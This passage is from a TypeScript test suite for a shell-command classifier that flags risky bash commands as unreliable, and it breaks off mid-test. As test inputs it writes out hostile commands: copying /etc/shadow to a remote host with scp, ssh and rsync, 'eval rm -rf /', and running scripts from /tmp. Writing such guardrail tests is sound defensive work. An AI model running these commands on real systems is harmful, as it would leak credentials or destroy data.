  // bash as a positional arg to non-shell commands is not a forwarder
  const r1 = extractBashTargets("which bash", PROJ);
  assert.equal(r1.reliable, true);
  const r2 = extractBashTargets("echo bash", PROJ);
  assert.equal(r2.reliable, true);
});

test("BT-B18c: `.` arithmetic or other non-source contexts not forwarder", () => {
  // `.` followed only by a flag is not a forwarder
  const r = extractBashTargets("printf .", PROJ);
  assert.equal(r.reliable, true);
});

// ============================================================
// Phase 5 (bash-stage-b-security-fixes): UNRELIABLE_COMMANDS
// wired into extractBashTargets main flow. BT-B7..BT-B14 in
// proposal's scenario→test coverage ledger.
// ============================================================

test("BT-B7: sed -i 'x' /etc/passwd is unreliable_command", () => {
  const r = extractBashTargets("sed -i 'x' /etc/passwd", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B8: python3 -c 'open(…)' is unreliable_command", () => {
  const r = extractBashTargets("python3 -c 'open(\"/etc/evil\",\"w\")'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B9: node -e 'require(…)' is unreliable_command", () => {
  const r = extractBashTargets("node -e 'require(\"fs\")'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B10: perl -e 'open…' is unreliable_command", () => {
  const r = extractBashTargets("perl -e 'open(F,\"</etc/passwd\")'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B11: osascript -e '…' is unreliable_command", () => {
  const r = extractBashTargets("osascript -e 'do shell script \"rm -rf /etc\"'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B12: scp /etc/shadow host:/tmp/ is unreliable_command", () => {
  const r = extractBashTargets("scp /etc/shadow user@host:/tmp/", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B13: ssh user@host 'cat /etc/shadow' is unreliable_command", () => {
  const r = extractBashTargets("ssh user@host 'cat /etc/shadow'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B14: rsync -a /etc/ host:/tmp/ is unreliable_command", () => {
  const r = extractBashTargets("rsync -a /etc/ host:/tmp/", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7b: kubectl exec pod -- cat /etc/shadow is unreliable_command", () => {
  const r = extractBashTargets("kubectl exec pod -- cat /etc/shadow", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7c: docker run alpine sh -c 'cat /etc/shadow' is unreliable_command", () => {
  const r = extractBashTargets("docker run alpine sh -c 'cat /etc/shadow'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7d: eval 'rm -rf /' is unreliable_command", () => {
  const r = extractBashTargets("eval 'rm -rf /'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7e: bash -c 'sed -i x /etc/passwd' is shell_forwarder (outer wins)", () => {
  // Reason precedence: shell_forwarder > unreliable_command
  const r = extractBashTargets("bash -c 'sed -i x /etc/passwd'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B7f: git status && sed -i 'x' /etc/passwd is unreliable_command (2nd fragment)", () => {
  const r = extractBashTargets("git status && sed -i 'x' /etc/passwd", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7g: command name in double-quoted string does NOT trigger unreliable_command", () => {
  // `echo "sed -i foo"` — sed is a string arg to echo, not a command name
  const r = extractBashTargets("echo \"sed -i foo\"", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B7h: /usr/bin/sed -i 's/a/b/' /etc/passwd is unreliable_command (basename match)", () => {
  const r = extractBashTargets("/usr/bin/sed -i 's/a/b/' /etc/passwd", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-B7i: sed with command_substitution still unreliable_command", () => {
  // scanUnreliable's command_substitution runs BEFORE unreliable_command
  // check; either reason is acceptable for this payload.
  const r = extractBashTargets("sed -i \"x\" $(cat /etc/passwd)", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) {
    assert.ok(["unreliable_command", "command_substitution"].includes(r.reason!),
      `expected unreliable_command or command_substitution, got ${r.reason}`);
  }
});

test("BT-B7j: env FOO=1 sed -i 'x' file is unreliable_command (wrapper transparent)", () => {
  const r = extractBashTargets("env FOO=1 sed -i 'x' file", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// ============================================================
// Phase 10.4a (P0): isShellForwarder must see compound separators
// (`&&`, `||`, `;`, `&`, `\n`). Before the fix, `echo hi && bash
// /tmp/evil.sh` returned reliable:true, targets:[] — the shell
// forwarder was invisible because it only scanned the first
// pipeline stage's first non-wrapper token.
// ============================================================

test("BT-B25: echo hi && bash /tmp/evil.sh is shell_forwarder", () => {
  const r = extractBashTargets("echo hi && bash /tmp/evil.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B26: echo hi && bash -c 'cat /etc/passwd' is shell_forwarder", () => {
  const r = extractBashTargets("echo hi && bash -c 'cat /etc/passwd'", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B27: echo hi ; source /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("echo hi ; source /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B28: echo hi ; . /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("echo hi ; . /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B29: echo hi || sh /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("echo hi || sh /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B30: true && env FOO=1 bash /tmp/evil.sh is shell_forwarder", () => {
  const r = extractBashTargets("true && env FOO=1 bash /tmp/evil.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B31: multi-line compound `echo hi\\nbash /tmp/x.sh` is shell_forwarder", () => {
  const r = extractBashTargets("echo hi\nbash /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

// ============================================================
// Phase 10.4b (P1): wrapper skip must handle short flags like
// `-v`, `-u`, `-p`. Before the fix, `command -v sed` mis-flagged
// as unreliable_command (fail-closed, noisy) and `env -u FOO
// bash /tmp/x.sh` missed the forwarder (P0 variant).
// ============================================================

test("BT-B32: command -v sed is NOT unreliable (wrapper short-flag)", () => {
  const r = extractBashTargets("command -v sed", PROJ);
  // command -v is a wrapper query, not a shell forwarder; sed alone
  // in a wrapper lookup should not trigger unreliable_command.
  assert.equal(r.reliable, true);
});

test("BT-B33: command -V sed is NOT unreliable (wrapper short-flag)", () => {
  const r = extractBashTargets("command -V sed", PROJ);
  assert.equal(r.reliable, true);
});

test("BT-B34: env -u FOO bash /tmp/x.sh is shell_forwarder", () => {
  const r = extractBashTargets("env -u FOO bash /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B35: env -u FOO -x bash /tmp/x.sh is shell_forwarder (multi short-flag)", () => {
  const r = extractBashTargets("env -u FOO -x bash /tmp/x.sh", PROJ);
  assert.equal(r.reliable, false);
  if (!r.reliable) assert.equal(r.reason, "shell_forwarder");
});

test("BT-B36: command -v bash is NOT shell_forwarder (query, not invocation)", () => {
  // `command -v bash` looks up bash's path — not executing it.
  const r = extractBashTargets("command -v bash", PROJ);
  assert.equal(r.reliable, true);
});

// ============================================================
// Phase 10.4c (P2): 4b hasOp must detect `&&`, `||`, `&`, `\n`.
// ============================================================

test("BT-B37: git status && rm -rf /etc/passwd is NOT silently misclassified", () => {
  // rm -rf /etc/passwd is a write/delete target; the compound must not
  // trip 4b's silent-form check on `git status`.
  const r = extractBashTargets("git status && rm -rf /etc/passwd", PROJ);
  // Should either be reliable with a delete target, or unreliable_command
  // if the silent-form check on the whole rawCommand catches it. Either way,
  // NOT silently passing as 0-target reliable.
  if (r.reliable) {
    assert.ok(
      r.targets.some((t) => t.action === "delete" && t.path === "/etc/passwd"),
      `expected delete target /etc/passwd, got ${JSON.stringify(r.targets)}`,
    );
  } else {
    assert.ok(["unreliable_command", "shell_forwarder"].includes(r.reason!),
      `expected unreliable, got ${r.reason}`);
  }
});

// ============================================================
// Change A: BT-CARGO-1..7 — cargo remains in UNRELIABLE_COMMANDS.
// Review feedback (2026-10-20): earlier we moved cargo into SILENT_COMMANDS
// but that re-opened 4b D6 fall-through bypasses on compound commands
// (`echo hi; cargo publish`) and `--manifest-path /etc/evil/Cargo.toml`
// reads. Restored the conservative posture: all `cargo` invocations are
// flagged `unreliable_command`, `cargo check`/`metadata` included.
// ============================================================

test("BT-CARGO-1: cargo_check_still_unreliable", () => {
  const r = extractBashTargets("cargo check", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-2: cargo_metadata_still_unreliable", () => {
  const r = extractBashTargets("cargo metadata", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-3: cargo_fmt_still_unreliable", () => {
  const r = extractBashTargets("cargo fmt", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-4: cargo_build_still_unreliable", () => {
  const r = extractBashTargets("cargo build", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-5: cargo_run_still_unreliable", () => {
  const r = extractBashTargets("cargo run", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-6: cargo_publish_still_unreliable", () => {
  const r = extractBashTargets("cargo publish", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-CARGO-7: cargo_install_still_unreliable", () => {
  const r = extractBashTargets("cargo install", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// Review-driven regressions: cargo in UNRELIABLE_COMMANDS must survive
// compound commands, pipelines, and `--manifest-path` cross-boundary reads.
test("BT-CARGO-8: compound_semicolon_cargo_publish_still_unreliable", () => {
  const r = extractBashTargets("echo hi; cargo publish", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
});

test("BT-CARGO-9: compound_logical_and_cargo_install_still_unreliable", () => {
  const r = extractBashTargets("cd ~/project && cargo install evil-pkg", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
});

test("BT-CARGO-10: pipeline_cargo_run_tee_still_unreliable", () => {
  const r = extractBashTargets("cargo run | tee out.txt", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
});

test("BT-CARGO-11: cargo_check_manifest_path_outside_still_unreliable", () => {
  const r = extractBashTargets("cargo check --manifest-path /etc/evil/Cargo.toml", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
});

// ============================================================
// Change B: BT-BLOB-1..18 — git blob 语法与 repo 内相对路径静默放行。
// 只读子命令 allow-set: status/log/diff/show/blame/rev-parse/rev-list/shortlog
// 允许 positional 参数:
//   - git blob 语法 <rev>:<path>
//   - repo 内相对路径(不以 / ~ ./ 开头,不含 ../,非 Windows 盘符)
// 非 allow-set 子命令(fetch/push/clone/add/commit/checkout)与越界路径
// (/etc/passwd 等 worktree 外绝对路径)仍判 unreliable_command。
// ============================================================

test("BT-BLOB-1: git_blame_with_repo_relative_path_is_silent", () => {
  const r = extractBashTargets("git blame src/main.ts", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-2: git_blame_with_L_flag_and_path_is_silent", () => {
  const r = extractBashTargets("git blame -L 1,10 src/main.ts", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-3: git_show_with_blob_syntax_is_silent", () => {
  const r = extractBashTargets("git show HEAD:file.txt", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-4: git_show_with_nested_blob_syntax_is_silent", () => {
  const r = extractBashTargets("git show HEAD:src/main.ts", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-5: git_diff_with_repo_relative_path_is_silent", () => {
  const r = extractBashTargets("git diff src/main.ts", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-6: git_log_with_blob_syntax_is_silent", () => {
  const r = extractBashTargets("git log HEAD:file.txt", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-7: git_status_with_repo_relative_path_is_silent", () => {
  const r = extractBashTargets("git status src/main.ts", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-8: git_rev_parse_with_blob_syntax_is_silent", () => {
  const r = extractBashTargets("git rev-parse HEAD:file.txt", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

// Regression: 既有 allow-set 内 revision 表达式静默放行
test("BT-BLOB-9: git_rev_parse_with_revision_is_silent_regression", () => {
  const r = extractBashTargets("git rev-parse HEAD~1", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-10: git_rev_parse_HEAD_is_silent_regression", () => {
  const r = extractBashTargets("git rev-parse HEAD", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

// 边界保持:非 allow-set 子命令仍判不可靠
test("BT-BLOB-11: git_fetch_still_unreliable", () => {
  const r = extractBashTargets("git fetch", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-12: git_push_still_unreliable", () => {
  const r = extractBashTargets("git push origin main", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-13: git_clone_still_unreliable", () => {
  const r = extractBashTargets("git clone https://example.com/repo", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-14: git_add_still_unreliable", () => {
  const r = extractBashTargets("git add src/main.ts", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-15: git_commit_still_unreliable", () => {
  const r = extractBashTargets("git commit -m 'fix'", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-16: git_checkout_still_unreliable", () => {
  const r = extractBashTargets("git checkout main", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// 边界保持:worktree 外绝对路径仍判不可靠
test("BT-BLOB-17: git_log_with_absolute_outside_path_still_unreliable", () => {
  const r = extractBashTargets("git log /etc/passwd", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-18: git_diff_with_absolute_outside_path_still_unreliable", () => {
  const r = extractBashTargets("git diff /etc/passwd", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// P1 regression (code review, 2026-10-20): the silent-form check in
// extractBashTargets step 4b MUST NOT let write subcommands through the
// permissive git path. GIT_BLOB_OK_SUBCOMMANDS gates only read-only
// subcommands; everything else in SILENT_COMMANDS.git (branch/tag/config/
// ls-files/remote) must fall through to strict rejection. Without this
// gate, `git config user.name Alice` silently succeeds as a reliable 0-target
// command while actually writing to .git/config.
test("BT-BLOB-19: git_config_with_positional_still_unreliable", () => {
  const r = extractBashTargets("git config user.name Alice", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-20: git_branch_with_positional_still_unreliable", () => {
  const r = extractBashTargets("git branch feature-x", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-21: git_tag_with_positional_still_unreliable", () => {
  const r = extractBashTargets("git tag v1.2.3", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-22: git_ls_files_with_positional_still_unreliable", () => {
  const r = extractBashTargets("git ls-files src", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-BLOB-23: git_remote_with_positional_still_unreliable", () => {
  const r = extractBashTargets("git remote origin", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// Sanity: the same subcommands WITHOUT a positional are still silent
// (subcommand-only form is unchanged).
test("BT-BLOB-24: git_branch_no_positional_is_silent", () => {
  const r = extractBashTargets("git branch", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-BLOB-25: git_ls_files_no_positional_is_silent", () => {
  const r = extractBashTargets("git ls-files", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

// ============================================================
// Change B: BT-RUN-1..9 — npm/yarn/pnpm `run <script>` 静默放行。
// 白名单脚本名: {test, lint, audit}
// 非白名单脚本名(build/publish/dev)与 `run -- scriptName` 形式仍判
// unreliable_command。`npm test` 直接形式(既有行为)仍静默。
// ============================================================

test("BT-RUN-1: npm_run_test_is_silent", () => {
  const r = extractBashTargets("npm run test", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-RUN-2: npm_run_lint_is_silent", () => {
  const r = extractBashTargets("npm run lint", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-RUN-3: yarn_run_test_is_silent", () => {
  const r = extractBashTargets("yarn run test", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-RUN-4: pnpm_run_audit_is_silent", () => {
  const r = extractBashTargets("pnpm run audit", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-RUN-5: npm_run_build_still_unreliable", () => {
  const r = extractBashTargets("npm run build", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-RUN-6: npm_run_publish_still_unreliable", () => {
  const r = extractBashTargets("npm run publish", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-RUN-7: npm_run_dev_still_unreliable", () => {
  const r = extractBashTargets("npm run dev", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-RUN-8: npm_run_with_dashdash_still_unreliable", () => {
  const r = extractBashTargets("npm run -- scriptName", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// Regression: `npm test` 直接形式(无 `run` 中间步骤)是既有 allow-set 内
// 子命令,应静默放行。
test("BT-RUN-9: npm_test_direct_form_silent_regression", () => {
  const r = extractBashTargets("npm test", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

// ============================================================
// Change C: BT-C1-* — tsc 纯检查形式静默放行。
// `tsc` 的空 allow-set 严格模式(既有行为)会拒绝任何 positional,本 change
// 添加"纯检查特例路径"——若首个非-flag token 是 --noEmit/--version/--help/-h
// 之一,且后续所有 flag 都属于白名单(见 D2),判静默。
// 越界 flag(--outDir/--emitDeclarationOnly/--noCheck/--build/-b 等)仍判 UNRL。
// ============================================================

test("BT-C1-1: tsc_noEmit_is_silent", () => {
  const r = extractBashTargets("tsc --noEmit", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C1-2: tsc_noEmit_with_project_is_silent", () => {
  const r = extractBashTargets("tsc --noEmit --project tsconfig.json", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C1-3: tsc_version_help_is_silent", () => {
  const r1 = extractBashTargets("tsc --version", PROJ);
  assert.equal(r1.reliable, true, `expected reliable for --version, got ${JSON.stringify(r1)}`);
  assert.deepEqual(r1.targets, []);
  const r2 = extractBashTargets("tsc --help", PROJ);
  assert.equal(r2.reliable, true, `expected reliable for --help, got ${JSON.stringify(r2)}`);
  assert.deepEqual(r2.targets, []);
});

test("BT-C1-4: tsc_without_noEmit_still_unreliable", () => {
  const r = extractBashTargets("tsc src/main.ts", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C1-5: tsc_outDir_still_unreliable", () => {
  const r = extractBashTargets("tsc --outDir /tmp/build", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C1-6: tsc_noEmit_emitDeclarationOnly_still_unreliable", () => {
  // --emitDeclarationOnly 会输出 d.ts 文件到磁盘,不在纯检查特例范围内
  const r = extractBashTargets("tsc --noEmit --emitDeclarationOnly", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

// ============================================================
// Change C: BT-C2-* — go vet / go fmt 静默放行。
// `go` 的 allow-set 从 {version, env} 扩展到 {version, env, vet, fmt}。
// vet/fmt 允许 repo 内相对路径 positional(如 ./...、src/main.go),但拒绝
// 绝对路径、worktree 外路径、越界 glob。go build/test/run/mod 仍判 UNRL。
// ============================================================

test("BT-C2-1: go_vet_all_is_silent", () => {
  const r = extractBashTargets("go vet ./...", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C2-2: go_vet_no_positional_is_silent", () => {
  const r = extractBashTargets("go vet", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C2-3: go_fmt_repo_relative_path_is_silent", () => {
  const r1 = extractBashTargets("go fmt ./...", PROJ);
  assert.equal(r1.reliable, true, `expected reliable for go fmt ./..., got ${JSON.stringify(r1)}`);
  assert.deepEqual(r1.targets, []);
  const r2 = extractBashTargets("go fmt src/main.go", PROJ);
  assert.equal(r2.reliable, true, `expected reliable for go fmt src/main.go, got ${JSON.stringify(r2)}`);
  assert.deepEqual(r2.targets, []);
});

test("BT-C2-4: go_vet_absolute_path_still_unreliable", () => {
  const r = extractBashTargets("go vet /tmp/evil", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C2-5: go_fmt_outside_worktree_still_unreliable", () => {
  const r = extractBashTargets("go fmt -w /tmp/evil.go", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C2-6: go_build_still_unreliable", () => {
  const r = extractBashTargets("go build ./...", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C2-7: go_test_run_still_unreliable", () => {
  const r1 = extractBashTargets("go test ./...", PROJ);
  assert.equal(r1.reliable, false, `expected unreliable for go test, got reliable`);
  const r2 = extractBashTargets("go run .", PROJ);
  assert.equal(r2.reliable, false, `expected unreliable for go run, got reliable`);
});

test("BT-C2-8: go_mod_still_unreliable", () => {
  const r1 = extractBashTargets("go mod tidy", PROJ);
  assert.equal(r1.reliable, false, `expected unreliable for go mod tidy, got reliable`);
  const r2 = extractBashTargets("go mod download", PROJ);
  assert.equal(r2.reliable, false, `expected unreliable for go mod download, got reliable`);
});

// Regression: `go version` / `go env` 既有静默行为保持。
test("BT-C2-9: go_version_env_still_silent_regression", () => {
  const r1 = extractBashTargets("go version", PROJ);
  assert.equal(r1.reliable, true, `expected reliable for go version, got ${JSON.stringify(r1)}`);
  const r2 = extractBashTargets("go env", PROJ);
  assert.equal(r2.reliable, true, `expected reliable for go env, got ${JSON.stringify(r2)}`);
});

// ============================================================
// Change C: BT-C3-* — npx --no-install 特例静默放行。
// `npx` 的空 allow-set 严格模式(既有行为)会拒绝任何 positional,本 change
// 添加"本地包特例路径"——若 token 中出现 `--no-install` 且前后所有 flag
// 都在允许白名单内、`--no-install` 之后恰好有一个非-flag positional 作为包名、
// 之后无更多 token,判静默。
// 无 `--no-install`(可能远程拉包)、多余 positional、`--` 分隔形式仍判 UNRL。
// ============================================================

test("BT-C3-1: npx_no_install_pkg_is_silent", () => {
  const r = extractBashTargets("npx --no-install eslint", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C3-2: npx_no_install_with_flags_is_silent", () => {
  const r = extractBashTargets("npx --no-install --color=always jest", PROJ);
  assert.equal(r.reliable, true, `expected reliable, got ${JSON.stringify(r)}`);
  assert.deepEqual(r.targets, []);
});

test("BT-C3-3: npx_without_no_install_still_unreliable", () => {
  const r = extractBashTargets("npx eslint", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) assert.equal(r.reason, "unreliable_command");
});

test("BT-C3-4: npx_no_install_with_extra_positional_still_unreliable", () => {
  // 第二个 positional 是包参数,与包名 pattern/path 二义性。
  // The command contains `src/**` which triggers the extractor's
  // glob_expansion check (which runs before 4a/4b). Both glob_expansion
  // and unreliable_command are UNRELIABLE results — we accept either
  // reason here.
  const r = extractBashTargets("npx --no-install eslint src/**", PROJ);
  assert.equal(r.reliable, false, `expected unreliable, got reliable`);
  if (!r.reliable) {
    assert.ok(
      ["unreliable_command", "glob_expansion"].includes(r.reason!),
      `expected unreliable_command or glob_expansion, got ${r.reason}`,
    );
  }
});

// ============================================================
// Substitution read-only exemption (bash-substitution-readonly-exemption)
// ------------------------------------------------------------
// Spec: "命令替换内只读命令豁免" — 当 `$(...)` 内的顶层命令属于
// SUBSTITUTION_READONLY_CMDS 白名单（basename/dirname/echo/printf/pwd/
// test/[）且参数形式受限（无未加引号 glob、无 heredoc、无子 shell、无
// 非豁免的嵌套 substitution）时，豁免 `command_substitution` 判定，让
// 命令走正常提取路径。
//
// 白名单外的形式、含副作用的参数、嵌套深度 >3、含未解析用户变量、
// 以及豁免后其他 guardrail 命中，全部保持原判定不变。
// ============================================================

// -------- 1.1 Positive: basename in read-only for loop --------

test("substitution_basename_in_for_loop_reliable: basename_in_for_loop_auto_exempt", () => {
  // spec 场景 1: `$(basename ...)` 在 read-only for 循环内自动放行
  const r = extractBashTargets(
    `for f in openspec/changes/archive/*/proposal.md; do echo "=== $(basename $f) ==="; head -20 "$f"; echo; done`,
    PROJ,
  );
  assert.equal(r.reliable, true, `expected reliable (basename exemption), got ${JSON.stringify(r)}`);
});

// -------- 1.1 Positive: nested basename+dirname --------

test("substitution_nested_basename_dirname_reliable: nested_basename_dirname_auto_exempt", () => {
